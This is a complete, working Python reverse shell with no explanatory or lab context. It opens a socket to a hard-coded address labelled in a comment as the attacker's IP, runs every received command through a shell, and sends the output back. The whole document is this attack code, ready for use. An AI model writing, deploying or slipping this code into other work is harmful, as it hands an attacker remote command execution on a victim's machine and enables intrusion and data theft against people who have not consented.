import socket
import subprocess

SERVER_IP = "192.168.1.100"  # Replace with attacker's IP
PORT = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    client.connect((SERVER_IP, PORT))
    
    while True:
        command = client.recv(1024).decode()
        
        if command.lower() == "exit":
            break
        
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        client.send(output.stdout.encode() + output.stderr.encode())

except Exception as e:
    print(f"Error: {e}")

finally:
    client.close()
